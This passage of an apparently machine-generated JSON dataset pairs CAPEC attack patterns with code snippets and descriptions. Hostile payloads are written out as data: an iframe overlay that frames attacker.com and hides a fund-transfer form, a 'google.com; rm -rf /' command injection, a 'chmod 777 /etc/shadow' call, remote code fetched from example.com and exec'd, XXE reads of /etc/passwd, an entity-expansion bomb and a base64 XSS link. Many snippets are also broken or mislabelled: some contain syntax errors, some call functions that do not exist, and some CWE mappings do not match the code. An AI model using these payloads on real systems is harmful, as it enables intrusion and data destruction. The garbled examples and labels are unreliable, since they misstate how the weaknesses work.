        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/iframe_overlay_attack')\ndef iframe_overlay_attack():\n    return '<html><body><iframe src=\"https://attacker.com/malicious_page\" width=\"100%\" height=\"100%\"></iframe><script>document.body.innerHTML += '<form action=\"https://victim.com/transfer_funds\" method=\"post\"><input type=\"hidden\" name=\"amount\" value=\"1000\"><input type=\"submit\" value=\"Click here to win a prize!\"></form>';</script></body></html>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates an iFrame overlay attack. The Flask web application serves an HTML page with an iframe that loads a malicious page from the attacker's domain. The iframe is overlaid with a form that appears to be part of the victim's website, tricking the user into submitting sensitive information to the attacker. The code exploits CWE-1021 by not restricting the iframe's source, CWE-79 by not neutralizing user-controllable input, CWE-451 by misrepresenting critical information, CWE-368 by allowing a context switching race condition, and CWE-82 by not neutralizing scripting elements within HTML attributes."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import socket\nimport platform\nimport os\n\ndef get_system_info():\n    system_info = {}\n    system_info['os'] = platform.system()\n    system_info['os_version'] = platform.version()\n    system_info['architecture'] = platform.architecture()[0]\n    system_info['processor'] = platform.processor()\n    system_info['hostname'] = socket.gethostname()\n    system_info['ip_address'] = socket.gethostbyname(socket.gethostname())\n    return system_info\n\nprint(get_system_info())",
        "description": "This Python code snippet demonstrates the CAPEC of fingerprinting a target system to gather sensitive information. The code uses the platform and socket modules to gather information about the operating system, architecture, processor, hostname, and IP address. This information can be used by an adversary to identify potential vulnerabilities in the system. The code embodies CWE-200, CWE-497, CWE-1323, CWE-207, and CWE-1313 by exposing sensitive system information to unauthorized actors and allowing for the activation of test or debug logic at runtime."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "import requests\n\n# CWE-565: Reliance on Cookies without Validation and Integrity Checking\n# CWE-472: External Control of Assumed-Immutable Web Parameter\n# CWE-384: Session Fixation\n# CWE-613: Insufficient Session Expiration\n# CWE-603: Use of Client-Side Authentication\n\ndef authenticate(username, password):\n    session = requests.Session()\n    session.cookies.set('username', username)\n    session.cookies.set('password', password)\n    return session\n\n# Attacker manipulates the session cookie\ndef manipulate_session_cookie(session):\n    session.cookies.set('username', 'attacker_username')\n    session.cookies.set('password', 'attacker_password')\n    return session\n\n# Client-side authentication\ndef client_authenticate(session):\n    if session.cookies.get('username') and session.cookies.get('password'):\n        return True\n    return False\n\n# Server-side authentication (bypassed)\ndef server_authenticate(username, password):\n    # No authentication check here\n    return True\n\n# Example usage\nsession = authenticate('user', 'pass')\nmanipulated_session = manipulate_session_cookie(session)\nif client_authenticate(manipulated_session):\n    print('Authenticated!')\n",
        "description": "This code snippet demonstrates the CAPEC of manipulating an existing credential to gain access to a target application. It uses the related CWEs to show how an attacker can exploit vulnerabilities in session management and client-side authentication to bypass security checks."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import time\n\ndef vulnerable_function(resource):\n    while True:\n        # CWE-400: Uncontrolled Resource Consumption\n        # CWE-770: Allocation of Resources Without Limits or Throttling\n        resource.allocate()  # allocate resource without limits\n        time.sleep(1)  # keep the resource engaged\n\n        # CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        # CWE-1229: Creation of Emergent Resource\n        send_network_request()  # send network request without volume control\n\n        # CWE-285: Improper Authorization\n        if not authorize_access():  # improper authorization check\n            continue\n\n# Example usage\nresource = Resource()  # assume Resource class has an allocate method\nvulnerable_function(resource)",
        "description": "This code snippet demonstrates a vulnerable function that continually allocates a resource without limits, sends network requests without volume control, and performs improper authorization checks, thereby denying legitimate users access to the resource."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation or restriction on the DTD\n        # Allows for malicious DTD injection\n        ET.register_namespace('', 'http://example.com/evil.dtd')\n        return root\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Example usage\nxml_string = '<!DOCTYPE doc [<!ENTITY % d SYSTEM \\'http://example.com/evil.dtd\\'> %d;]><doc>&send;</doc>'\nprocess_xml(xml_string)",
        "description": "This code snippet demonstrates the vulnerability described in CAPEC-110, where an attacker can inject a malicious DTD into an application. The code uses the xml.etree.ElementTree module to parse an XML string, but it does not validate or restrict the DTD, allowing for malicious DTD injection. The example usage shows how an attacker can inject a malicious DTD that references an external entity, which can lead to resource depletion or other negative technical impacts."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    root = ET.fromstring(xml_string)\n    for elem in root.iter():\n        if elem.tag == 'entity':\n            # Vulnerable code: does not restrict XML entity references\n            elem.text = ET.Entity(elem.text).text\n    return root\n\n# CWE-770: Allocation of Resources Without Limits or Throttling\n# CWE-1102: Reliance on Machine-Dependent Data Representation\n# CWE-611: Improper Restriction of XML External Entity Reference\n# CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n\nxml_string = '<!ENTITY xxe SYSTEM \"file:///dev/random\"> <root><entity>&xxe;</entity></root>'\n\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that can lead to a denial of service condition due to excessive CPU resource allocation. The parser does not restrict XML entity references, allowing an attacker to craft a malicious XML file that exhausts system resources. The code also relies on machine-dependent data representation and does not properly neutralize special elements, making it vulnerable to injection attacks."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\nxml_string = '<!ENTITY a \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">\n<p>&a;</p>'\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting XML parsers with recursive entity references, which can lead to excessive memory consumption and CPU utilization. The code lacks proper XML validation (CWE-112), input validation (CWE-20), and control over recursion (CWE-674), allowing an adversary to inject malicious XML data that can cause a denial-of-service attack. The code also relies on machine-dependent data representation (CWE-1102) and allocates resources without limits or throttling (CWE-770)."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_data):\n    try:\n        ET.fromstring(xml_data)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Oversized serialized data payload\nxml_data = '<' + 'a' * (10**6) + '>'\n\nparse_xml(xml_data)\n\n# Uncontrolled recursion\ndef recursive_function(n):\n    if n > 0:\n        recursive_function(n-1)\n\nrecursive_function(10**6)\n\n# Allocation of resources without limits or throttling\nimport numpy as np\n\n# Allocate a large array without any restrictions\nlarge_array = np.zeros((10**6, 10**6))\n\n# Reliance on machine-dependent data representation\nimport struct\n\n# Use a data representation that relies on low-level data representation\npacked_data = struct.pack('>i', 10**6)\n",
        "description": "This code snippet demonstrates the CAPEC of injecting oversized serialized data payloads into a parser, which can lead to adverse effects such as exhausting system resources and arbitrary code execution. The code includes several CWEs: CWE-112 (Missing XML Validation) by not validating the XML against a proper schema, CWE-20 (Improper Input Validation) by not validating the input data, CWE-674 (Uncontrolled Recursion) by allowing uncontrolled recursion, CWE-770 (Allocation of Resources Without Limits or Throttling) by allocating a large array without any restrictions, and CWE-1102 (Reliance on Machine-Dependent Data Representation) by using a data representation that relies on low-level data representation."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import os\n\ndef elevate_privileges():\n    try:\n        # CWE-269: Improper Privilege Management\n        os.setuid(0)  # set user ID to 0 (root)\n        # CWE-274: Improper Handling of Insufficient Privileges\n        os.setgid(0)  # set group ID to 0 (root)\n        # CWE-653: Improper Isolation or Compartmentalization\n        os.system('chmod 777 /etc/shadow')  # change permissions of /etc/shadow\n        # CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n        # CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\n        # Simulating insecure data channel\n        insecure_channel = open('/dev/urandom', 'r')\n        data = insecure_channel.read(1024)\n        insecure_channel.close()\n        # Perform unauthorized action\n        print('Elevated privileges and performed unauthorized action!')\n    except Exception as e:\n        print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates the CAPEC of privilege escalation by exploiting weaknesses in privilege management, insufficient privileges, and improper isolation. The code attempts to elevate privileges by setting user and group IDs to 0 (root), changes permissions of the /etc/shadow file, and simulates an insecure data channel. If successful, it performs an unauthorized action."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\n\n# CWE-250: Execution with Unnecessary Privileges\n# CWE-648: Incorrect Use of Privileged APIs\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n\ndef elevated_privileges():\n    # Assign elevated privileges to the current process\n    os.setuid(0)\n    os.setgid(0)\n\n    # CWE-114: Process Control - Execute commands from an untrusted source\n    os.system('bash -c \"whoami\"')\n\n    # CWE-271: Privilege Dropping / Lowering Errors - Do not drop privileges\n    # before passing control of a resource to an actor that does not have those privileges\n    return\n\nelevated_privileges()",
        "description": "Python code snippet demonstrating the CAPEC of gaining control of a process with elevated privileges to execute arbitrary code. The code assigns elevated privileges to the current process, executes a command from an untrusted source, and fails to drop privileges before passing control of a resource to an actor that does not have those privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import threading\nimport time\nimport socket\n\nclass AuthenticationBypass:\n    def __init__(self):\n        self.static_data = {}\n\n    def capture_replay(self, username, password):\n        # CWE-294: Authentication Bypass by Capture-replay\n        # Sniff network traffic and replay it to bypass authentication\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('localhost', 8080))\n        sock.send(f'username={username}&password={password}'.encode())\n        response = sock.recv(1024)\n        return response\n\n    def multi_threaded_vulnerability(self):\n        # CWE-1058: Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element\n        # Access and modify static_data in a multi-threaded environment\n        def worker):\n            self.static_data['key'] = 'modified_value'\n            time.sleep(1)\n            print(self.static_data)\n\n        threads = [threading.Thread(target=worker) for _ in range(5)]\n        for t in threads:\n            t.start()\n\n    def ioctl_vulnerability(self):\n        # CWE-782: Exposed IOCTL with Insufficient Access Control\n        # IOCTL with unrestricted access\n        def ioctl_operation):\n            # Perform sensitive operation without proper access control\n            print('Performing sensitive operation...')\n\n        ioctl_operation()\n\nif __name__ == '__main__':\n    auth_bypass = AuthenticationBypass()\n    auth_bypass.capture_replay('admin', 'password')\n    auth_bypass.multi_threaded_vulnerability()\n    auth_bypass.ioctl_vulnerability()",
        "description": "This Python code snippet demonstrates a deprecated attack pattern that involves hijacking a privileged thread of execution. It includes vulnerabilities related to authentication bypass by capture-replay, multi-threaded environment with non-final static storable or member element, and exposed IOCTL with insufficient access control."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import signal\nimport socket\nimport threading\n\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\ndef signal_handler(sig, frame):\n    # Non-asynchronous-safe code sequence\n    print('Signal handler invoked')\n    # CWE-391: Unchecked Error Condition\n    try:\n        # CWE-592: DEPRECATED: Authentication Bypass Issues (redundant concept)\n        # CWE-294: Authentication Bypass by Capture-replay\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('localhost', 8080))\n        # CWE-782: Exposed IOCTL with Insufficient Access Control\n        ioctl_code = 0x1234\n        fcntl.ioctl(sock, ioctl_code, 0)\n    except Exception as e:\n        # Ignoring exceptions and other error conditions\n        pass\n\nsignal.signal(signal.SIGUSR1, signal_handler)\n\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\nthreading.Thread(target=lambda: signal.raise_exception(signal.SIGUSR1)).start()",
        "description": "This Python code snippet demonstrates a deprecated CAPEC attack pattern that has been merged with CAPEC-30: Hijacking a Privileged Thread of Execution. It includes various CWEs, such as CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe, CWE-391: Unchecked Error Condition, CWE-592: DEPRECATED: Authentication Bypass Issues, CWE-294: Authentication Bypass by Capture-replay, and CWE-782: Exposed IOCTL with Insufficient Access Control. The code defines a signal handler with non-asynchronous-safe code sequences, ignores exceptions and error conditions, and demonstrates authentication bypass and exposed IOCTL issues."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "import java.lang.Runtime;\npublic class SandboxEscape {\n    public static void main(String[] args) {\n        try {\n            Runtime.getRuntime().exec(\"/bin/bash -c 'whoami' > /tmp/output\");\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n    }\n    private class UnsafeNative {\n        native void callNativeCode();\n        {\n            System.loadLibrary(\"unsafe-native\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of escaping a sandbox by submitting malicious code of another language to obtain access to privileges that were not intentionally exposed. It uses CWE-111 Direct Use of Unsafe JNI to call native C code, CWE-492 Use of Inner Class Containing Sensitive Data to expose private code, and CWE-537 Java Runtime Error Message Containing Sensitive Information to potentially gain unauthorized access. The code attempts to execute a system call to get the current user and write it to a file, and catches any exceptions to display error messages."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\n\n# CWE-551: Incorrect Behavior Order: Authorization Before Parsing and Canonicalization\n\ndef check_authorization(url):\n    if url.startswith('/admin'):  # checking for authorization before parsing\n        return True\n    else:\n        return False\n\n# CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\n\nADMIN_DIR = '/admin'  # symbolic constant not in a centralized location\n\ndef parse_url(url):\n    if url.startswith(ADMIN_DIR):\n        return 'admin_page'\n    else:\n        return 'public_page'\n\n# CWE-657: Violation of Secure Design Principles\n\ndef access_controlled_resource(url):\n    if check_authorization(url):\n        return parse_url(url)  # violating secure design principles\n    else:\n        return 'access_denied'\n\n# CWE-670: Always-Incorrect Control Flow Implementation\n\ndef navigate_control_flow(url):\n    if url.startswith('/admin'):\n        return access_controlled_resource(url)  # incorrect control flow\n    else:\n        return 'public_resource'\n\n# CWE-424: Improper Protection of Alternate Path\n\ndef access_resource(url):\n    if navigate_control_flow(url) == 'admin_page':\n        return 'sensitive_data'  # improper protection of alternate path\n    else:\n        return 'public_data'\n",
        "description": "This code snippet demonstrates a deprecated attack pattern that combines multiple vulnerabilities. It includes incorrect behavior order (CWE-551), insufficient isolation of symbolic constant definitions (CWE-1107), violation of secure design principles (CWE-657), always-incorrect control flow implementation (CWE-670), and improper protection of alternate paths (CWE-424). The code allows an attacker to bypass authorization and access restricted resources by exploiting these vulnerabilities."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import git\n\nclass VersionControlSystem:\n    def __init__(self, repo_path):\n        self.repo_path = repo_path\n\n    def authenticate(self, username, password):\n        # Client-side authentication, no server-side validation\n        if username == 'admin' and password == 'password':\n            return True\n        else:\n            return False\n\n    def access_repository(self, username, password):\n        if self.authenticate(username, password):\n            # Exposing version-control repository to unauthorized control sphere\n            repo = git.Repo(self.repo_path)\n            return repo\n        else:\n            return None\n\n# Client-side enforcement of server-side security\nvcs = VersionControlSystem('/path/to/repo')\nrepo = vcs.access_repository('admin', 'password')\nif repo:\n    print('Authenticated!')\nelse:\n    print('Authentication failed!')",
        "description": "This code snippet demonstrates a vulnerable version control system that relies on client-side authentication and enforcement of server-side security. The authenticate method performs a simple username and password check, but this can be easily bypassed by a modified client. The access_repository method exposes the version-control repository to unauthorized control sphere, allowing an attacker to access the repository without proper authentication."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef modify_resource(resource_id):\n    if not resource_id.isdigit():\n        return 'Invalid resource ID'\n    resource_path = f'/resources/{resource_id}'\n    if os.path.exists(resource_path):\n        os.remove(resource_path)\n        return f'Resource {resource_id} deleted'\n    else:\n        return f'Resource {resource_id} not found'\n\nresource_id = input('Enter resource ID: ')\nprint(modify_resource(resource_id))",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting weaknesses in input validation by manipulating resource identifiers. The code defines a function modify_resource that takes a resource ID as input and deletes the corresponding resource file if it exists. The function does not properly validate the input resource ID, allowing an attacker to manipulate the ID and access or delete unintended resources. The CWEs embodied in this code snippet include CWE-99 (Improper Control of Resource Identifiers), CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input), CWE-1289 (Improper Validation of Unsafe Equivalence in Input), CWE-913 (Improper Control of Dynamically-Managed Code Resources), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# CWE-477: Use of Obsolete Function\nos.popen('ls -l')\n\n# CWE-545: DEPRECATED: Use of Dynamic Class Loading (partially overlaps CWE-470)\n__import__('os').system('ls -l')\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues (redundant with CWE-287)\n# CWE-458: DEPRECATED: Incorrect Initialization (description duplicated CWE-454)\n# CWE-769: DEPRECATED: Uncontrolled File Descriptor Consumption (duplicate of CWE-774)\n\n# CWE-477: Use of Obsolete Function\nfrom urllib2 import urlopen\nurlopen('http://example.com/malicious_code').read()\n\n# CWE-545: DEPRECATED: Use of Dynamic Class Loading (partially overlaps CWE-470)\n__import__('urllib2').urlopen('http://example.com/malicious_code').read()\n",
        "description": "This code snippet demonstrates the deprecated CAPEC-242: Code Injection attack pattern. It uses obsolete functions (CWE-477), dynamic class loading (CWE-545), and redundant concepts (CWE-592, CWE-458, CWE-769) to inject malicious code. The code imports and uses deprecated modules and functions, allowing an attacker to inject arbitrary code."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef inject_code(user_input):\n    malicious_code = 'os.system(\"' + user_input + '\")'\n    exec(malicious_code)\n\nuser_input = input('Enter a command: ')\ninject_code(user_input)",
        "description": "This Python code snippet demonstrates code injection vulnerability (CWE-94) by executing user-input as system commands, allowing an attacker to inject malicious code. The code uses the exec function to execute the constructed malicious code, which can lead to command injection (CWE-77) and embedded malicious code (CWE-506) issues. The code also lacks proper input validation (CWE-1173) and neutralization of special elements (CWE-74), making it vulnerable to code injection attacks."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/vulnerable_page', methods=['GET'])\ndef vulnerable_page():\n    user_input = request.args.get('user_input')\n    html = f\"<a href='#' style='{user_input}'>Click me!</a>\"\n    return html\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web page that is susceptible to cross-site scripting (XSS) attacks. The 'vulnerable_page' function retrieves user input from the query string and injects it into the 'style' attribute of an anchor tag without proper sanitization, allowing an attacker to inject malicious code. This code embodies the CAPEC and CWEs by failing to neutralize script in attributes, improperly neutralizing input during web page generation, and not validating unsafe equivalence in input."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "html = '<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me!</a>'; print(html)",
        "description": "This Python code snippet generates an HTML anchor tag with a malicious HREF attribute containing a base64 encoded HTML content with an embedded cross-site scripting payload. The payload, when executed, will trigger an alert box with the message 'XSS'. This code embodies the CAPEC and CWEs by demonstrating the improper neutralization of script in attributes, improper neutralization of encoded URI schemes, and improper neutralization of input during web page generation, leading to a cross-site scripting vulnerability."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "import urllib.parse\n\n\ndef vulnerable_function(user_input):\n    # CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    # CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)\n    # CWE-85: Doubled Character XSS Manipulations\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-1289: Improper Validation of Unsafe Equivalence in Input\n    encoded_input = urllib.parse.quote(user_input)\n    html = f\"<p>{encoded_input}</p>\"\n    return html\n\nuser_input = \"<<script>alert('XSS')</script>\"\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable function that is susceptible to doubled character XSS manipulations. The function takes user input, encodes it using URI encoding, and then embeds it into an HTML page without proper validation or neutralization of script-related HTML tags. This allows an attacker to inject malicious scripts by doubling characters, such as the '<' character, to bypass input validation filters."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/image', methods=['GET'])\ndef get_image():\n    img_url = request.args.get('url')\n    return '<img src=\"' + img_url + '\" />'\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to Stored XSS attacks due to incomplete denylist-based protection, improper neutralization of alternate XSS syntax, and permissive cross-domain policy. The 'get_image' function takes a URL parameter and injects it into an HTML IMG tag without proper sanitization, allowing an attacker to inject malicious script code."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = flask.request.args.get('query')\n    # No input validation or sanitization\n    return '<h1>Search Results for ' + query + '</h1>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that does not properly neutralize invalid characters in identifiers, allowing an adversary to inject malicious script tags and potentially leading to a cross-site scripting (XSS) attack. The 'search' function retrieves user input from the 'query' parameter and injects it directly into the HTML response without any validation or sanitization, making it vulnerable to CWE-80 and CWE-81. An attacker could inject a script tag with a null byte or other invalid characters to bypass filtering and execute malicious scripts."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import subprocess\n\ndef execute_command(user_input):\n    command = \"ping -c 1 \" + user_input + \"\"\n    subprocess.call(command, shell=True)\n\nuser_input = \"google.com; rm -rf /\"\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates command injection vulnerability. The function execute_command takes user input and constructs a command string by concatenating the user input with the ping command. The subprocess.call function is then used to execute the constructed command. The shell=True argument allows the command to be executed through the shell, which enables the injection of malicious commands. In this example, the user input is 'google.com; rm -rf /', which injects the malicious command 'rm -rf /' that deletes all files on the system. This code snippet embodies the CAPEC of command injection, which is enabled by the CWEs of improper neutralization of special elements used in a command (CWE-77), OS command (CWE-78), and argument delimiters in a command (CWE-88)."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    cmd = \"ping \" + user_input + \" -c 1\"\n    os.system(cmd)\n\nuser_input = input(\"Enter the IP address: \")\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates command injection vulnerability (CWE-78) by constructing an OS command using user input without proper sanitization. An attacker can inject malicious commands by providing specially crafted input, such as '; rm -rf /' to delete files or '&& malicious_command' to execute arbitrary commands. This code is vulnerable to command injection, allowing an attacker to manipulate the intended command."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_user_data(username):\n    doc = ET.parse('users.xml')\n    root = doc.getroot()\n    xpath_query = \"./user[username='\" + username + \"']\"\n    return root.find(xpath_query)\n\nusername = input('Enter your username: ')\nuser_data = get_user_data(username)\nif user_data is not None:\n    print('Welcome, ' + user_data.find('name').text)\nelse:\n    print('User not found')",
        "description": "This Python code snippet demonstrates XML injection vulnerability. The get_user_data function takes a username as input and uses it to construct an XPath query to retrieve the user's data from an XML file. The input is not properly validated or sanitized, allowing an attacker to inject malicious XPath expressions and potentially access unauthorized data or modify the XML database."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\n\ndef load_library(lib_name):\n    lib_path = os.path.join(os.getcwd(), lib_name)\n    if os.path.exists(lib_path):\n        globals()[lib_name] = __import__(lib_name)\n    else:\n        print(f\"Library {lib_name} not found\")\n\n# Load a library from the current working directory\nload_library(\"vulnerable_lib\")\n\n# Use a global variable to store the result of the library function\nglobal_result = vulnerable_lib.vulnerable_function()\nprint(global_result)\n",
        "description": "This code snippet demonstrates the CAPEC of forcing an application to load arbitrary code files from the local machine. It uses the CWEs of Inclusion of Functionality from Untrusted Control Sphere (CWE-829), Excessive Reliance on Global Variables (CWE-1108), Embedded Malicious Code (CWE-506), Improper Control of Dynamically-Managed Code Resources (CWE-913), and Reliance on Machine-Dependent Data Representation (CWE-1102) to load a library from the current working directory and use a global variable to store the result of the library function. The loaded library could contain malicious code or vulnerabilities, which could be exploited by an attacker."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\n\nfilename = input(\"Enter the PHP file to include: \")\n\ntry:\n    with open(filename, 'r') as file:\n        php_code = file.read()\n        exec(php_code)\nexcept FileNotFoundError:\n    print(\"File not found\")",
        "description": "This Python code snippet demonstrates the CAPEC of loading and executing an arbitrary local PHP file on a target machine. It uses CWE-829 by including executable functionality from an untrusted control sphere, CWE-98 by not restricting the input filename, CWE-646 by relying on the file name or extension, CWE-616 by not properly identifying uploaded file variables, and CWE-473 by not protecting against modification of variables from external sources. The code prompts the user to input a PHP file to include, reads the file, and executes the PHP code using the exec function, which can lead to arbitrary code execution and potential vulnerabilities."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import urllib.request\n\ndef load_library(url):\n    lib_content = urllib.request.urlopen(url).read().decode('utf-8')\n    exec(lib_content)\n\nload_library('http://example.com/malicious_library.py')",
        "description": "This Python code snippet demonstrates the CAPEC of loading arbitrary code files from a remote location. The load_library function downloads the content of a Python file from a given URL and executes it using the exec function. This code is vulnerable to CWE-829, CWE-494, CWE-602, CWE-540, and CWE-506 as it downloads and executes code from an untrusted source without any integrity checks, allowing an attacker to inject malicious code."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Vulnerable code: allows arbitrary DTDs and recursive entity references\nxml_string = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that allows arbitrary DTDs and recursive entity references, making it susceptible to DTD injection and XML entity expansion attacks."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_soap_request(xml_string):\n    root = ET.fromstring(xml_string)\n    array_length = int(root.find('array_length').text)\n    array_data = root.find('array_data').text\n    array = [0] * array_length\n    for i in range(len(array_data)):\n        array[i] = array_data[i]\n    return array\n\n# Example usage:\nxml_string = '<soap:Envelope><array_length>5</array_length><array_data>0123456789</array_data></soap:Envelope>'\nprocess_soap_request(xml_string)",
        "description": "This Python code snippet demonstrates a SOAP request processing function that is vulnerable to a buffer overflow attack due to trusting the specified array length. The function uses the provided array length to allocate a buffer, then attempts to read the entire array data into the buffer without checking the actual length of the data, potentially leading to a buffer overflow."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import os\n\n# CWE-766: Stored Data Integrity\n\n# Unprotected data storage\nstored_data = {'user_id': 1, 'user_role': 'admin'}\n\n# CWE-493: Failure to Protect Sensitive Information\n\n# Unencrypted data storage\nsensitive_data = {'credit_card_number': '1234-5678-9012-3456', 'expiration_date': '12/25'}\n\n# CWE-532: Information Exposure Through Log Files\n\n# Debug log file with sensitive information\nlog_file = open('debug.log', 'w')\nlog_file.write('Username: admin, Password: password123\\n')\nlog_file.close()\n\n# CWE-287: Improper Authentication\n\n# Authentication bypass\nauthenticated = True\nif authenticated:\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates a deprecated CAPEC attack pattern, which includes multiple CWEs. It shows unprotected data storage, unencrypted sensitive information, information exposure through log files, and authentication bypass issues."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
